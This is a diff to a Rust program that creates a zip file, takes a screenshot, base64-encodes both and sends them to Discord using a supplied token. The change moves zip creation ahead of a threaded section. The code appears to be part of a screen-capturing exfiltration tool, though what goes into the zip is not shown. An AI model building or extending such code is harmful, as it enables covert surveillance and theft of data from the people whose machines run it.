@@ -20,14 +20,26 @@ lazy_static::lazy_static! {
 // token: The provided vac token
 fn main(token: &str) {
 
+    //////////////////////////////////
+    //                              //
+    //  Define then pass to thread  //
+    //                              //
+    //////////////////////////////////
+    
+    // Create the new zip file
+    let mut zip = create_zip_file();
+
+    //////////////////////////////////
+    //                              //
+    //  The below is in the thread  //
+    //                              //
+    //////////////////////////////////
+
     // Create a new system struct
     let mut sys: System = System::new_all();
 
     // Refresh this for every loop in thread
     let current_time: String = chrono::offset::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
-
-    // Create the new zip file
-    let mut zip = create_zip_file();
 
     // Take a scrteenshot
     let image_buffer: String = take_screenshot(&mut zip, &current_time);
@@ -38,7 +50,8 @@ fn main(token: &str) {
     // Send the files to discord
     let image_data: String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
     let zip_data: String = format!("data:application/zip;base64,{}", base64::encode(&std::fs::read(ZIP_PATH.to_string() + ".zip").expect("failed to read zip file")).to_string());
-    send_files_to_discord(token, &image_data, &zip_data)
+    send_files_to_discord(token, &image_data, &zip_data);
+    
 }
 
 // Create a new folder with the current time as it's name
